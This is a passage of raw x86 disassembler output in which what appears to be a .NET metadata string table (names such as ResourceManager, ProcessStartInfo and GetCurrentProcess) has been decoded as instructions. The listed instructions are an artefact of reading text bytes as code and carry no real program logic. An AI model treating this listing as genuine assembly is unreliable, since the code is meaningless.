  403b23:	add    BYTE PTR gs:0x7463,ch
  403b29:	outs   dx,DWORD PTR ds:[esi]
  403b2a:	jb     0x403b2c
  403b2c:	push   ebx
  403b2d:	jns    0x403ba2
  403b2f:	je     0x403b96
  403b31:	ins    DWORD PTR es:[edi],dx
  403b32:	cs push edx
  403b34:	gs jae 0x403ba6
  403b37:	jne    0x403bab
  403b39:	arpl   WORD PTR [ebp+0x73],sp
  403b3c:	add    BYTE PTR [edx+0x65],dl
  403b3f:	jae    0x403bb0
  403b41:	jne    0x403bb5
  403b43:	arpl   WORD PTR [ebp+0x4d],sp
  403b46:	popa   
  403b47:	outs   dx,BYTE PTR ds:[esi]
  403b48:	popa   
  403b49:	addr16 gs jb 0x403b4d
  403b4d:	jb     0x403bb4
  403b4f:	jae    0x403bc0
  403b51:	jne    0x403bc5
  403b53:	arpl   WORD PTR [ebp+0x4d],sp
  403b56:	popa   
  403b57:	outs   dx,BYTE PTR ds:[esi]
  403b58:	add    BYTE PTR [ebx+0x79],dl
  403b5b:	jae    0x403bd1
  403b5d:	gs ins DWORD PTR es:[edi],dx
  403b5f:	cs inc edi
  403b61:	ins    BYTE PTR es:[edi],dx
  403b62:	outs   dx,DWORD PTR ds:[esi]
  403b63:	bound  esp,QWORD PTR [ecx+0x6c]
  403b66:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403b6d:	add    BYTE PTR [ebx+0x75],al
  403b70:	ins    BYTE PTR es:[edi],dx
  403b71:	je     0x403be8
  403b73:	jb     0x403bda
  403b75:	dec    ecx
  403b76:	outs   dx,BYTE PTR ds:[esi]
  403b77:	outs   dx,WORD PTR ds:[esi]
  403b79:	add    BYTE PTR [edx+0x65],dh
  403b7c:	jae    0x403bed
  403b7e:	jne    0x403bf2
  403b80:	arpl   WORD PTR [ebp+0x43],sp
  403b83:	jne    0x403bf1
  403b85:	je     0x403bfc
  403b87:	jb     0x403bee
  403b89:	add    BYTE PTR [edi+0x65],ah
  403b8c:	je     0x403bed
  403b8e:	push   edx
  403b8f:	gs jae 0x403c01
  403b92:	jne    0x403c06
  403b94:	arpl   WORD PTR [ebp+0x4d],sp
  403b97:	popa   
  403b98:	outs   dx,BYTE PTR ds:[esi]
  403b99:	popa   
  403b9a:	addr16 gs jb 0x403b9e
  403b9e:	addr16 gs je 0x403c01
  403ba2:	inc    ebx
  403ba3:	jne    0x403c11
  403ba5:	je     0x403c1c
  403ba7:	jb     0x403c0e
  403ba9:	add    BYTE PTR [ebx+0x65],dh
  403bac:	je     0x403c0d
  403bae:	inc    ebx
  403baf:	jne    0x403c1d
  403bb1:	je     0x403c28
  403bb3:	jb     0x403c1a
  403bb5:	add    BYTE PTR [edi+0x65],ah
  403bb8:	je     0x403c19
  403bba:	inc    edx
  403bbb:	popa   
  403bbc:	outs   dx,BYTE PTR ds:[esi]
  403bbd:	outs   dx,BYTE PTR ds:[esi]
  403bbe:	gs jb  0x403bc1
  403bc1:	addr16 gs je 0x403c24
  403bc5:	inc    esp
  403bc6:	gs ins BYTE PTR es:[edi],dx
  403bc8:	gs je  0x403c30
  403bcb:	push   edi
  403bcc:	popa   
  403bcd:	jb     0x403c3d
  403bcf:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  403bd6:	pop    edi
  403bd7:	inc    esp
  403bd8:	gs ins BYTE PTR es:[edi],dx
  403bda:	gs je  0x403c42
  403bdd:	push   edi
  403bde:	jae    0x403c53
  403be0:	push   ebx
  403be1:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x69666e6f
  403be9:	jb     0x403c58
  403beb:	popa   
  403bec:	je     0x403c57
  403bee:	outs   dx,DWORD PTR ds:[esi]
  403bef:	outs   dx,BYTE PTR ds:[esi]
  403bf0:	add    BYTE PTR [edi+0x65],ah
  403bf3:	je     0x403c54
  403bf5:	dec    ecx
  403bf6:	outs   dx,BYTE PTR ds:[esi]
  403bf7:	jbe    0x403c5a
  403bf9:	ins    BYTE PTR es:[edi],dx
  403bfa:	imul   esp,DWORD PTR [ebx+edx*2+0x65],0x72657672
  403c02:	add    BYTE PTR [edi+0x65],ah
  403c05:	je     0x403c66
  403c07:	dec    esi
  403c08:	outs   dx,DWORD PTR ds:[esi]
  403c09:	inc    ecx
  403c0a:	outs   dx,BYTE PTR ds:[esi]
  403c0b:	jae    0x403c84
  403c0d:	gs jb  0x403c10
  403c10:	addr16 gs je 0x403c73
  403c14:	dec    edi
  403c15:	bound  esi,QWORD PTR [ebx+0x6f]
  403c18:	ins    BYTE PTR es:[edi],dx
  403c19:	gs je  0x403c81
  403c1c:	inc    ebx
  403c1d:	outs   dx,DWORD PTR ds:[esi]
  403c1e:	ins    DWORD PTR es:[edi],dx
  403c1f:	ins    DWORD PTR es:[edi],dx
  403c20:	popa   
  403c21:	outs   dx,BYTE PTR ds:[esi]
  403c22:	fs dec esp
  403c24:	imul   ebp,DWORD PTR [esi+0x65],0x6974704f
  403c2b:	outs   dx,DWORD PTR ds:[esi]
  403c2c:	outs   dx,BYTE PTR ds:[esi]
  403c2d:	add    BYTE PTR [edi+0x65],ah
  403c30:	je     0x403c91
  403c32:	push   ebp
  403c33:	outs   dx,BYTE PTR ds:[esi]
  403c34:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  403c38:	outs   dx,BYTE PTR ds:[esi]
  403c39:	dec    edi
  403c3a:	jo     0x403cb0
  403c3c:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  403c43:	pop    edi
  403c44:	push   ebp
  403c45:	jae    0x403ca8
  403c47:	add    BYTE PTR gs:[bx+0x65],ah
  403c4c:	je     0x403cad
  403c4e:	push   ebp
  403c4f:	jae    0x403cb2
  403c51:	xor    al,BYTE PTR gs:[bx+si]
  403c55:	addr16 gs je 0x403cb8
  403c59:	push   ebp
  403c5a:	jae    0x403cbd
  403c5c:	addr16 gs inc ebp
  403c5f:	js     0x403cc4
  403c61:	ins    BYTE PTR es:[edi],dx
  403c62:	jne    0x403cc8
  403c64:	gs push edi
  403c66:	jae    0x403cdb
  403c68:	add    BYTE PTR [edi+0x65],ah
  403c6b:	je     0x403ccc
  403c6d:	push   ebp
  403c6e:	jae    0x403cd1
  403c70:	addr16 gs inc esi
  403c73:	outs   dx,DWORD PTR ds:[esi]
  403c74:	jb     0x403cd9
  403c76:	add    BYTE PTR gs:[edi+0x65],ah
  403c7a:	je     0x403cdb
  403c7c:	push   ebp
  403c7d:	jae    0x403ce0
  403c7f:	addr16 gs push eax
  403c82:	jb     0x403cf3
  403c84:	push   0x65
  403c86:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  403c8a:	ins    BYTE PTR es:[edi],dx
  403c8b:	ins    BYTE PTR es:[edi],dx
  403c8c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403c91:	outs   dx,BYTE PTR ds:[esi]
  403c92:	add    BYTE PTR [edi+0x65],ah
  403c95:	je     0x403cf6
  403c97:	push   ebp
  403c98:	jae    0x403cfb
  403c9a:	addr16 gs push eax
  403c9d:	jb     0x403d0e
  403c9f:	push   0x65
  403ca1:	arpl   WORD PTR [esi+ecx*2+0x61],si
  403ca5:	ins    DWORD PTR es:[edi],dx
  403ca6:	add    BYTE PTR gs:[edi+0x65],ah
  403caa:	je     0x403d0b
  403cac:	push   ebp
  403cad:	jae    0x403d10
  403caf:	addr16 gs push ecx
  403cb2:	jne    0x403d1d
  403cb4:	gs je  0x403cb7
  403cb7:	addr16 gs je 0x403d1a
  403cbb:	pop    ecx
  403cbc:	gs jae 0x403d00
  403cbf:	outs   dx,BYTE PTR ds:[esi]
  403cc0:	jae    0x403d39
  403cc2:	gs jb  0x403cc5
  403cc5:	inc    ebx
  403cc6:	jne    0x403d34
  403cc8:	je     0x403d3f
  403cca:	jb     0x403d31
  403ccc:	add    BYTE PTR [edx+0x61],al
  403ccf:	outs   dx,BYTE PTR ds:[esi]
  403cd0:	outs   dx,BYTE PTR ds:[esi]
  403cd1:	gs jb  0x403cd4
  403cd4:	inc    esp
  403cd5:	gs ins BYTE PTR es:[edi],dx
  403cd7:	gs je  0x403d3f
  403cda:	push   edi
  403cdb:	popa   
  403cdc:	jb     0x403d4c
  403cde:	imul   ebp,DWORD PTR [esi+0x67],0x6c654400
  403ce5:	gs je  0x403d4d
  403ce8:	push   edi
  403ce9:	jae    0x403d5e
  403ceb:	push   ebx
  403cec:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x69666e6f
  403cf4:	jb     0x403d63
  403cf6:	popa   
  403cf7:	je     0x403d62
  403cf9:	outs   dx,DWORD PTR ds:[esi]
  403cfa:	outs   dx,BYTE PTR ds:[esi]
  403cfb:	add    BYTE PTR [ecx+0x6e],cl
  403cfe:	jbe    0x403d61
  403d00:	ins    BYTE PTR es:[edi],dx
  403d01:	imul   esp,DWORD PTR [ebx+edx*2+0x65],0x72657672
  403d09:	add    BYTE PTR [esi+0x6f],cl
  403d0c:	inc    ecx
  403d0d:	outs   dx,BYTE PTR ds:[esi]
  403d0e:	jae    0x403d87
  403d10:	gs jb  0x403d13
  403d13:	dec    edi
  403d14:	bound  esi,QWORD PTR [ebx+0x6f]
  403d17:	ins    BYTE PTR es:[edi],dx
  403d18:	gs je  0x403d80
  403d1b:	inc    ebx
  403d1c:	outs   dx,DWORD PTR ds:[esi]
  403d1d:	ins    DWORD PTR es:[edi],dx
  403d1e:	ins    DWORD PTR es:[edi],dx
  403d1f:	popa   
  403d20:	outs   dx,BYTE PTR ds:[esi]
  403d21:	fs dec esp
  403d23:	imul   ebp,DWORD PTR [esi+0x65],0x6974704f
  403d2a:	outs   dx,DWORD PTR ds:[esi]
  403d2b:	outs   dx,BYTE PTR ds:[esi]
  403d2c:	add    BYTE PTR [ebp+0x6e],dl
  403d2f:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  403d33:	outs   dx,BYTE PTR ds:[esi]
  403d34:	dec    edi
  403d35:	jo     0x403dab
  403d37:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  403d3e:	xor    al,BYTE PTR gs:[bx+si]
  403d42:	push   ebp
  403d43:	jae    0x403da6
  403d45:	addr16 gs inc ebp
  403d48:	js     0x403dad
  403d4a:	ins    BYTE PTR es:[edi],dx
  403d4b:	jne    0x403db1
  403d4d:	gs push edi
  403d4f:	jae    0x403dc4
  403d51:	add    BYTE PTR [ebp+0x73],dl
  403d54:	popa   
  403d55:	addr16 gs inc esi
  403d58:	outs   dx,DWORD PTR ds:[esi]
  403d59:	jb     0x403dbe
  403d5b:	add    BYTE PTR gs:[ebp+0x73],dl
  403d5f:	popa   
  403d60:	addr16 gs push eax
  403d63:	jb     0x403dd4
  403d65:	push   0x65
  403d67:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  403d6b:	ins    BYTE PTR es:[edi],dx
  403d6c:	ins    BYTE PTR es:[edi],dx
  403d6d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403d72:	outs   dx,BYTE PTR ds:[esi]
  403d73:	add    BYTE PTR [ebp+0x73],dl
  403d76:	popa   
  403d77:	addr16 gs push eax
  403d7a:	jb     0x403deb
  403d7c:	push   0x65
  403d7e:	arpl   WORD PTR [esi+ecx*2+0x61],si
  403d82:	ins    DWORD PTR es:[edi],dx
  403d83:	add    BYTE PTR gs:[ebp+0x73],dl
  403d87:	popa   
  403d88:	addr16 gs push ecx
  403d8b:	jne    0x403df6
  403d8d:	gs je  0x403d90
  403d90:	pop    ecx
  403d91:	gs jae 0x403dd5
  403d94:	outs   dx,BYTE PTR ds:[esi]
  403d95:	jae    0x403e0e
  403d97:	gs jb  0x403d9a
  403d9a:	popa   
  403d9b:	jb     0x403e04
  403d9d:	jae    0x403d9f
  403d9f:	jae    0x403e06
  403da1:	outs   dx,BYTE PTR ds:[esi]
  403da2:	fs gs jb 0x403da6
  403da6:	jbe    0x403e09
  403da8:	ins    BYTE PTR es:[edi],dx
  403da9:	jne    0x403e10
  403dab:	add    BYTE PTR [ebx+0x79],dl
  403dae:	jae    0x403e24
  403db0:	gs ins DWORD PTR es:[edi],dx
  403db2:	cs push edx
  403db4:	jne    0x403e24
  403db6:	je     0x403e21
  403db8:	ins    DWORD PTR es:[edi],dx
  403db9:	gs cs push esi
  403dbc:	gs jb  0x403e32
  403dbf:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  403dc6:	push   esp
  403dc7:	popa   
  403dc8:	jb     0x403e31
  403dca:	gs je  0x403e13
  403dcd:	jb     0x403e30
  403dcf:	ins    DWORD PTR es:[edi],dx
  403dd0:	gs ja  0x403e42
  403dd3:	jb     0x403e40
  403dd5:	inc    ecx
  403dd6:	je     0x403e4c
  403dd8:	jb     0x403e43
  403dda:	bound  esi,QWORD PTR [ebp+0x74]
  403ddd:	add    BYTE PTR gs:[ebx+0x79],dl
  403de1:	jae    0x403e57
  403de3:	gs ins DWORD PTR es:[edi],dx
  403de5:	cs push edx
  403de7:	jne    0x403e57
  403de9:	je     0x403e54
  403deb:	ins    DWORD PTR es:[edi],dx
  403dec:	gs cs dec ecx
  403def:	outs   dx,BYTE PTR ds:[esi]
  403df0:	je     0x403e57
  403df2:	jb     0x403e63
  403df4:	jo     0x403e49
  403df6:	gs jb  0x403e6f
  403df9:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  403e00:	ins    DWORD PTR es:[edi],dx
  403e01:	push   esi
  403e02:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  403e09:	je     0x403e7f
  403e0b:	jb     0x403e76
  403e0d:	bound  esi,QWORD PTR [ebp+0x74]
  403e10:	add    BYTE PTR gs:[ebx+0x4c],al
  403e14:	push   ebx
  403e15:	inc    ebx
  403e16:	outs   dx,DWORD PTR ds:[esi]
  403e17:	ins    DWORD PTR es:[edi],dx
  403e18:	jo     0x403e86
  403e1a:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  403e21:	jb     0x403e8c
  403e23:	bound  esi,QWORD PTR [ebp+0x74]
  403e26:	add    BYTE PTR gs:[ebx+0x79],dl
  403e2a:	jae    0x403ea0
  403e2c:	gs ins DWORD PTR es:[edi],dx
  403e2e:	cs push edx
  403e30:	gs data16 ins BYTE PTR es:[edi],dx
  403e33:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403e38:	outs   dx,BYTE PTR ds:[esi]
  403e39:	add    BYTE PTR [ecx+0x73],al
  403e3c:	jae    0x403ea3
  403e3e:	ins    DWORD PTR es:[edi],dx
  403e3f:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  403e43:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  403e4b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403e52:	jae    0x403ec7
  403e54:	gs ins DWORD PTR es:[edi],dx
  403e56:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403e5a:	gs jae 0x403ec0
  403e5d:	jb     0x403ec8
  403e5f:	jo     0x403ed5
  403e61:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403e68:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403e6f:	jae    0x403ee4
  403e71:	gs ins DWORD PTR es:[edi],dx
  403e73:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403e77:	gs popaw 
  403e7a:	jne    0x403ee8
  403e7c:	je     0x403ebf
  403e7e:	ins    BYTE PTR es:[edi],dx
  403e7f:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  403e86:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403e8d:	jae    0x403f02
  403e8f:	gs ins DWORD PTR es:[edi],dx
  403e91:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403e95:	outs   dx,DWORD PTR ds:[esi]
  403e96:	ins    DWORD PTR es:[edi],dx
  403e97:	jo     0x403efa
  403e99:	outs   dx,BYTE PTR ds:[esi]
  403e9a:	jns    0x403edd
  403e9c:	je     0x403f12
  403e9e:	jb     0x403f09
  403ea0:	bound  esi,QWORD PTR [ebp+0x74]
  403ea3:	add    BYTE PTR gs:[ecx+0x73],al
  403ea7:	jae    0x403f0e
  403ea9:	ins    DWORD PTR es:[edi],dx
  403eaa:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  403eae:	jb     0x403f1f
  403eb0:	fs jne 0x403f16
  403eb3:	je     0x403ef6
  403eb5:	je     0x403f2b
  403eb7:	jb     0x403f22
  403eb9:	bound  esi,QWORD PTR [ebp+0x74]
  403ebc:	add    BYTE PTR gs:[ecx+0x73],al
  403ec0:	jae    0x403f27
  403ec2:	ins    DWORD PTR es:[edi],dx
  403ec3:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403ec7:	outs   dx,DWORD PTR ds:[esi]
  403ec8:	jo     0x403f43
  403eca:	jb     0x403f35
  403ecc:	addr16 push 0x74744174
  403ed2:	jb     0x403f3d
  403ed4:	bound  esi,QWORD PTR [ebp+0x74]
  403ed7:	add    BYTE PTR gs:[ecx+0x73],al
  403edb:	jae    0x403f42
  403edd:	ins    DWORD PTR es:[edi],dx
  403ede:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  403ee2:	gs jb  0x403f58
  403ee5:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403eec:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403ef3:	jae    0x403f68
  403ef5:	gs ins DWORD PTR es:[edi],dx
  403ef7:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  403efb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  403f03:	outs   dx,DWORD PTR ds:[esi]
  403f04:	outs   dx,BYTE PTR ds:[esi]
  403f05:	inc    ecx
  403f06:	je     0x403f7c
  403f08:	jb     0x403f73
  403f0a:	bound  esi,QWORD PTR [ebp+0x74]
  403f0d:	add    BYTE PTR gs:[ecx+0x73],al
  403f11:	jae    0x403f78
  403f13:	ins    DWORD PTR es:[edi],dx
  403f14:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  403f18:	outs   dx,BYTE PTR ds:[esi]
  403f19:	outs   dx,WORD PTR ds:[esi]
  403f1b:	jb     0x403f8a
  403f1d:	popa   
  403f1e:	je     0x403f89
  403f20:	outs   dx,DWORD PTR ds:[esi]
  403f21:	outs   dx,BYTE PTR ds:[esi]
  403f22:	popa   
  403f23:	ins    BYTE PTR es:[edi],dx
  403f24:	push   esi
  403f25:	gs jb  0x403f9b
  403f28:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403f2f:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  403f36:	popa   
  403f37:	je     0x403f9e
  403f39:	ins    BYTE PTR es:[edi],dx
  403f3a:	ins    BYTE PTR es:[edi],dx
  403f3b:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  403f43:	popa   
  403f44:	arpl   WORD PTR [esi+edx*2+0x65],si
  403f48:	jb     0x403fbd
  403f4a:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403f51:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  403f58:	gs jne 0x403fcf
  403f5b:	jb     0x403fbe
  403f5d:	ins    BYTE PTR es:[edi],dx
  403f5e:	push   edx
  403f5f:	gs jae 0x403fd1
  403f62:	jne    0x403fd6
  403f64:	arpl   WORD PTR [ebp+0x73],sp
  403f67:	dec    esp
  403f68:	popa   
  403f69:	outs   dx,BYTE PTR ds:[esi]
  403f6a:	addr16 jne 0x403fce
  403f6d:	addr16 gs inc ecx
  403f70:	je     0x403fe6
  403f72:	jb     0x403fdd
  403f74:	bound  esi,QWORD PTR [ebp+0x74]
  403f77:	add    BYTE PTR gs:[ecx+0x73],al
  403f7b:	jae    0x403fe2
  403f7d:	ins    DWORD PTR es:[edi],dx
  403f7e:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403f82:	gs ins BYTE PTR es:[edi],dx
  403f84:	popa   
  403f85:	jns    0x403fda
  403f87:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  403f8e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403f95:	jae    0x40400a
  403f97:	gs ins DWORD PTR es:[edi],dx
  403f99:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  403f9d:	gs jns 0x403fe6
  403fa0:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  403fa8:	bound  esi,QWORD PTR [ebp+0x74]
  403fab:	add    BYTE PTR gs:[ecx+0x73],al
  403faf:	jae    0x404016
  403fb1:	ins    DWORD PTR es:[edi],dx
  403fb2:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  403fb6:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  403fbd:	gs dec ebx
  403fbf:	gs jns 0x404003
  403fc2:	je     0x404038
  403fc4:	jb     0x40402f
  403fc6:	bound  esi,QWORD PTR [ebp+0x74]
  403fc9:	add    BYTE PTR gs:[ebx+0x79],dl
  403fcd:	jae    0x404043
  403fcf:	gs ins DWORD PTR es:[edi],dx
  403fd1:	cs push edx
  403fd3:	jne    0x404043
  403fd5:	je     0x404040
  403fd7:	ins    DWORD PTR es:[edi],dx
  403fd8:	gs cs inc ebx
  403fdb:	outs   dx,DWORD PTR ds:[esi]
  403fdc:	ins    DWORD PTR es:[edi],dx
  403fdd:	jo     0x404048
  403fdf:	ins    BYTE PTR es:[edi],dx
  403fe0:	gs jb  0x404036
  403fe3:	gs jb  0x40405c
  403fe6:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  403fed:	outs   dx,BYTE PTR ds:[esi]
  403fee:	je     0x404059
  403ff0:	ins    DWORD PTR es:[edi],dx
  403ff1:	gs inc ebx
  403ff3:	outs   dx,DWORD PTR ds:[esi]
  403ff4:	ins    DWORD PTR es:[edi],dx
  403ff5:	jo     0x404058
  403ff7:	je     0x404062
  403ff9:	bound  ebp,QWORD PTR [ecx+0x6c]
  403ffc:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  404004:	bound  esi,QWORD PTR [ebp+0x74]
  404007:	add    BYTE PTR gs:[ebx+0x79],dl
  40400b:	jae    0x404081
  40400d:	gs ins DWORD PTR es:[edi],dx
  40400f:	cs inc esp
  404011:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  404018:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  40401f:	jne    0x404088
  404021:	addr16 popa 
  404023:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  404027:	je     0x40409d
  404029:	jb     0x404094
  40402b:	bound  esi,QWORD PTR [ebp+0x74]
  40402e:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  404033:	jne    0x40409c
  404035:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  40403d:	jae    0x40403f
  40403f:	inc    ebx
  404040:	outs   dx,DWORD PTR ds:[esi]
  404041:	ins    DWORD PTR es:[edi],dx
  404042:	jo     0x4040ad
  404044:	ins    BYTE PTR es:[edi],dx
  404045:	popa   
  404046:	je     0x4040b1
  404048:	outs   dx,DWORD PTR ds:[esi]
  404049:	outs   dx,BYTE PTR ds:[esi]
  40404a:	push   edx
  40404b:	gs ins BYTE PTR es:[edi],dx
  40404d:	popa   
  40404e:	js     0x4040b1
  404050:	je     0x4040bb
  404052:	outs   dx,DWORD PTR ds:[esi]
  404053:	outs   dx,BYTE PTR ds:[esi]
  404054:	jae    0x404097
  404056:	je     0x4040cc
  404058:	jb     0x4040c3
  40405a:	bound  esi,QWORD PTR [ebp+0x74]
  40405d:	add    BYTE PTR gs:[esi+eiz*2+0x73],dl
  404062:	inc    esp
  404063:	gs ins BYTE PTR es:[edi],dx
  404065:	gs je  0x4040cd
  404068:	push   eax
  404069:	jb     0x4040da
  40406b:	push   0x65
  40406d:	arpl   WORD PTR [eax+eax*1+0x53],si
  404071:	jns    0x4040e6
  404073:	je     0x4040da
  404075:	ins    DWORD PTR es:[edi],dx
  404076:	cs push esp
  404078:	push   0x64616572
  40407d:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  404084:	gs popa 
  404086:	add    BYTE PTR fs:[edi+0x65],ah
  40408a:	je     0x4040eb
  40408c:	inc    ebx
  40408d:	jne    0x404101
  40408f:	jb     0x4040f6
  404091:	outs   dx,BYTE PTR ds:[esi]
  404092:	je     0x4040e8
  404094:	push   0x64616572
  404099:	add    BYTE PTR [edi+0x65],ah
  40409c:	je     0x4040fd
  40409e:	inc    ebx
  40409f:	jne    0x404113
  4040a1:	jb     0x404108
  4040a3:	outs   dx,BYTE PTR ds:[esi]
  4040a4:	je     0x4040fb
  4040a6:	dec    ecx
  4040a7:	inc    ebx
  4040a8:	jne    0x404116
  4040aa:	je     0x404121
  4040ac:	jb     0x404113
  4040ae:	add    BYTE PTR [edi+0x65],al
  4040b1:	je     0x4040f6
  4040b3:	outs   dx,DWORD PTR ds:[esi]
  4040b4:	outs   dx,BYTE PTR ds:[esi]
  4040b5:	jae    0x404126
  4040b7:	ins    BYTE PTR es:[edi],dx
  4040b8:	gs inc esi
  4040ba:	popa   
  4040bb:	ins    BYTE PTR es:[edi],dx
  4040bc:	ins    BYTE PTR es:[edi],dx
  4040bd:	bound  esp,QWORD PTR [ecx+0x63]
  4040c0:	imul   edx,DWORD PTR [ebp+0x49],0x43
  4040c4:	jne    0x404132
  4040c6:	je     0x40413d
  4040c8:	jb     0x40412f
  4040ca:	add    BYTE PTR [ebx+0x65],dh
  4040cd:	je     0x40412e
  4040cf:	inc    ebx
  4040d0:	jne    0x404144
  4040d2:	jb     0x404139
  4040d4:	outs   dx,BYTE PTR ds:[esi]
  4040d5:	je     0x40412c
  4040d7:	dec    ecx
  4040d8:	inc    ebx
  4040d9:	jne    0x404147
  4040db:	je     0x404152
  4040dd:	jb     0x404144
  4040df:	add    BYTE PTR [ebx+0x6f],al
  4040e2:	outs   dx,BYTE PTR ds:[esi]
  4040e3:	jae    0x404154
  4040e5:	ins    BYTE PTR es:[edi],dx
  4040e6:	add    BYTE PTR gs:[ebx+0x79],dl
  4040ea:	jae    0x404160
  4040ec:	gs ins DWORD PTR es:[edi],dx
  4040ee:	cs push esp
  4040f0:	gs js  0x404167
  4040f3:	add    BYTE PTR [ebp+0x6e],al
  4040f6:	arpl   WORD PTR [edi+0x64],bp
  4040f9:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  404100:	pop    edi
  404101:	dec    edi
  404102:	jne    0x404178
  404104:	jo     0x40417b
  404106:	je     0x40414d
  404108:	outs   dx,BYTE PTR ds:[esi]
  404109:	arpl   WORD PTR [edi+0x64],bp
  40410c:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  404113:	pop    edi
  404114:	inc    ebx
  404115:	outs   dx,DWORD PTR ds:[esi]
  404116:	fs gs push eax
  404119:	popa   
  40411a:	add    BYTE PTR gs:[bx+0x65],ah
  40411f:	je     0x404180
  404121:	push   ebp
  404122:	push   esp
  404123:	inc    esi
  404124:	cmp    BYTE PTR [eax],al
  404126:	push   esp
  404127:	gs js  0x40419e
  40412a:	dec    ecx
  40412b:	outs   dx,BYTE PTR ds:[esi]
  40412c:	outs   dx,WORD PTR ds:[esi]
  40412e:	add    BYTE PTR [edi+0x65],ah
  404131:	je     0x404192
  404133:	push   esp
  404134:	gs js  0x4041ab
  404137:	dec    ecx
  404138:	outs   dx,BYTE PTR ds:[esi]
  404139:	outs   dx,WORD PTR ds:[esi]
  40413b:	add    BYTE PTR [edi+0x65],ah
  40413e:	je     0x40419f
  404140:	dec    edi
  404141:	inc    ebp
  404142:	dec    ebp
  404143:	inc    ebx
  404144:	outs   dx,DWORD PTR ds:[esi]
  404145:	fs gs push eax
  404148:	popa   
  404149:	add    BYTE PTR gs:[bx+0x65],ah
  40414e:	je     0x4041af
  404150:	inc    ecx
  404151:	dec    esi
  404152:	push   ebx
  404153:	dec    ecx
  404154:	inc    ebx
  404155:	outs   dx,DWORD PTR ds:[esi]
  404156:	fs gs push eax
  404159:	popa   
  40415a:	add    BYTE PTR gs:[bp+di+0x74],dl
  40415f:	jb     0x4041ca
  404161:	outs   dx,BYTE PTR ds:[esi]
  404162:	add    BYTE PTR [bx+di+0x73],cl
  404166:	dec    esi
  404167:	jne    0x4041d5
  404169:	ins    BYTE PTR es:[edi],dx
  40416a:	dec    edi
  40416b:	jb     0x4041b2
  40416d:	ins    DWORD PTR es:[edi],dx
  40416e:	jo     0x4041e4
  404170:	jns    0x404172
  404172:	inc    ebp
  404173:	outs   dx,BYTE PTR ds:[esi]
  404174:	jbe    0x4041df
  404176:	jb     0x4041e7
  404178:	outs   dx,BYTE PTR ds:[esi]
  404179:	ins    DWORD PTR es:[edi],dx
  40417a:	outs   dx,BYTE PTR gs:[esi]
  40417c:	je     0x40417e
  40417e:	inc    ebp
  40417f:	js     0x4041ea
  404181:	je     0x404183
  404183:	push   esp
  404184:	data16 jae 0x4041db
  404187:	gs popa 
  404189:	ins    DWORD PTR es:[edi],dx
  40418a:	push   eax
  40418b:	jb     0x4041fc
  40418d:	push   0x65
  40418f:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  404193:	ins    BYTE PTR es:[edi],dx
  404194:	ins    BYTE PTR es:[edi],dx
  404195:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40419a:	outs   dx,BYTE PTR ds:[esi]
  40419b:	add    BYTE PTR [ebp+0x72],dl
  40419e:	imul   eax,DWORD PTR [eax],0x46746547
  4041a4:	jne    0x404212
  4041a6:	ins    BYTE PTR es:[edi],dx
  4041a7:	jns    0x4041fa
  4041a9:	jne    0x40420c
  4041ab:	ins    BYTE PTR es:[edi],dx
  4041ac:	imul   esp,DWORD PTR [esi+0x69],0x72556465
  4041b3:	imul   eax,DWORD PTR [esi+0x6f],0x6d614e72
